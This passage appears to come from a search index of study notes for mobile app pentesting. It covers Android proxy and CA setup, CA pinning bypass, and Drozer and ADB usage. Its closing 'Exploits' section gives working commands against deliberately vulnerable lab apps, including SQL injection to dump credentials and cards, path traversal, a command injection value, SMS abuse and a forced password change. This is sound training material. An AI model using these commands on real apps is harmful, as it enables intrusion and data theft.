<pre><code>~/Library/Android/sdk/emulator/emulator -avd &lt;avd_name&gt; -http-proxy &lt;IP&gt;:&lt;PORT&gt;  -writable-system\n</code></pre></p> <p>Remount /system as writable / Copy the certificate to the device <pre><code>adb root\nadb remount\nadb push &lt;cert&gt;.0 /sdcard/\nadb shell mv /sdcard/&lt;cert&gt;.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/&lt;cert&gt;.0\nadb reboot\n</code></pre></p> <p>Browsing to Settings -&gt; Security -&gt; Trusted Credentials should show the new \u201cPortswigger CA\u201d as a system trusted CA</p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#ca-pinning-bypass","title":"CA Pinning Bypass","text":"<p>Automated Tool - apk-mitm <pre><code># Install\n$ sudo apt install nodejs npm\n$ npm install -g apk-mitm\n\n# Example\n$ apk-mitm &lt;path-to-apk&gt;\n</code></pre></p> <p>Reference</p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#-_2","title":"---","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#staticdynamic-code-analysis","title":"Static/Dynamic Code Analysis","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#drozer","title":"Drozer","text":"<p>Install Drozer <pre><code>pip3 install drozer-3.0.2-py3-none-any.whl\npip install twisted\npip install service_identity\n</code></pre></p> <p>Install Drozen-Agent <pre><code>adb install drozer-agent.apk\n</code></pre></p> <p>Establish the communication between the Drozer Client and Agent <pre><code>adb forward tcp:31415 tcp:31415\n\ndrozer console connect\n</code></pre></p> <p>RoadMap 1) Static Code Analysis 2) SQL Injection 3) Path/Directory Traversal 4) Vulnerable Activities 5) Vulnerable Recievers 6) Vulnerable Services     1) /data/data/{package}/files 7) Shared Preferences     1) /data/data/{package}/shared_prefs 8) Local Databases     1) /data/data/{package}/databases         1) .header on         2) .mode column         3) .timer on         4) SELECT * FROM table;</p> <p>Drozer Commands <pre><code># List all the installed packages\n$ dz&gt; run app.package.list\n\n# Find accessible content URIs\n$ dz&gt; run scanner.provider.finduris -a &lt;package_name&gt;\n\n# Find the package name of a specific app\n$ dz&gt; run app.package.list -f (string to be searched)\n\n# See basic information\n$ dz&gt; run app.package.info -a (package name)\n\n# Identify the exported application components\n$ dz&gt; run app.package.attacksurface (package name)\n\n# Identify the list of exported Activities\n$ dz&gt; run app.activity.info -a (package name)\n\n# Launch the exported Activities\n$ dz&gt; run app.activity.start --component (package name) (component name)\n\n# Identify the list of exported Broadcast receivers\n$ dz&gt; run app.broadcast.info -a (package name)\n\n# Send a message to a Broadcast receiver\n$ dz&gt; run app.broadcast.send --action (broadcast receiver name) --component (package name) (component name)  --extra (number of arguments)\n\n# Detect SQL injections in content providers\n$ dz&gt; run scanner.provider.injection -a (package name)\n\n# Detect Path Traversal in content providers\n$ dz&gt; run scanner.provider.traversal -a (package name)\n</code></pre></p> <p>ADB Commands <pre><code>adb shell pm list packages              # List installed packages\nadb shell pm path &lt;package&gt;             # Returns path of package\nadb shell am start                      # Starts activity\nadb shell am startservice               # Starts service\nadb shell am broadcast                  # Send a broadcast\n\nadb shell pull &lt;device_path&gt; &lt;local_path&gt;     \nadb shell push &lt;local_path&gt; &lt;device_path&gt;\n\nadb install &lt;package&gt;                   # Install pacakge\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#qark","title":"QARK","text":"<p>Install QARK <pre><code>pip2 install qark\nqark --help\n\nOR\n\ngit clone https://github.com/linkedin/qark\npython2 setup.py install\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#exploits","title":"Exploits","text":"<p>FourGates Broadcast receivers <pre><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver\u00a0 --extra string phoneNumber 5554 --extra string message \"hacked\"\n</code></pre></p> <p>InjectMe SQL Injection <pre><code>dz&gt; run scanner.provider.injection -a com.elearnsecurity.injectme\ndz&gt; run scanner.provider.finduris -a com.elearnsecurity.injectme\ndz &gt; run app.provider.query content://com.elearnsecurity.injectme.provider.CredentialProvider/credentials/\n\n\nadb shell content query --uri content://com.elearnsecurity.injectme.provider.CredentialProvider/credentials/\n</code></pre></p> <p>FileBrowser Path Traversal  <pre><code>dz&gt; run scanner.provider.traversal -a com.els.filebrowser\ndz&gt; run app.provider.read content://com.els.filebrowser/../../../proc/cpuinfo\n</code></pre></p> <p>LeakResult Bypass <pre><code>$ adb shell logcat\n\ndz&gt; run app.activity.start --component com.elearnsecurity.insecureactivities com.elearnsecurity.insecureactivities.LeakyActivity\n\n\nadb shell am start -n com.elearnsecurity.insecureactivities/.LeakyActivity\n</code></pre></p> <p>SillyService Command Injection <pre><code>adb shell am startservice \u2013n com.elearnsecurity.sillyservice/.SillyService \u2013e \"COMMAND\" \"find; ls\"\n</code></pre></p> <p>VulnerableReceiver BroadcastReceiver <pre><code>dz &gt; run app.broadcast.send --action com.elearnsecurity.vulnerablereceiver.CHANGEPW --component com.elearnsecurity.vulnerablereceiver com.elearnsecurity.vulnerablereceiver.VulnerableReceiver --extra string PASSWORD \"hacked\"\n\n\n\nam broadcast -a com.elearnsecurity.vulnerablereceiver.CHANGEPW -e PASSWORD \"hacked\"\n</code></pre></p> <p>WeakWallet Sql Injection <pre><code>dz&gt; run scanner.provider.injection -a com.elearnsecurity.weakwallet\ndz&gt; run scanner.provider.finduris -a com.elearnsecurity.weakwallet\ndz &gt; run app.provider.query content://com.elearnsecurity.provider.Wallet/cards\n\n\nadb shell content query --uri content://com.elearnsecurity.provider.Wallet/cards/\n</code></pre></p>"}]}